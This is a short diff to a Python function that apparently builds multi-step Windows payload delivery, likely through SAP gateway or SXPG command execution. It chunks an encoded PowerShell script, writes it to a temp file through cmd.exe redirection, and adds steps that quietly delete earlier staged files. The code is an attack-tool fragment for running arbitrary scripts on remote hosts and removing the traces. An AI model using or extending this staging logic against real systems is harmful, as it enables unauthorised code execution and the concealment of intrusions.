@@ -389,7 +389,11 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
     chunk_size = 80
     gw_chunks = [enc_u16[i:i+chunk_size]
                  for i in range(0, len(enc_u16), chunk_size)]
-    steps = []
+    steps = [
+        # Clean up old files first
+        {"command": f"cmd.exe /C del /q {tmp} {tmp}.ps1 2>nul",
+         "params": ""},
+    ]
     for idx, chunk in enumerate(gw_chunks):
         redir = ">" if idx == 0 else ">>"
         steps.append({
@@ -407,7 +411,11 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
         ps_script.encode("ascii")).decode("ascii")
     sxpg_chunks = [enc_ascii[i:i+chunk_size]
                    for i in range(0, len(enc_ascii), chunk_size)]
-    sxpg_steps = []
+    sxpg_steps = [
+        # Clean up old files first
+        {"command": "cmd.exe",
+         "params": f"/C del /q {tmp} {tmp}.ps1 2>nul"},
+    ]
     for idx, chunk in enumerate(sxpg_chunks):
         redir = ">" if idx == 0 else ">>"
         sxpg_steps.append({
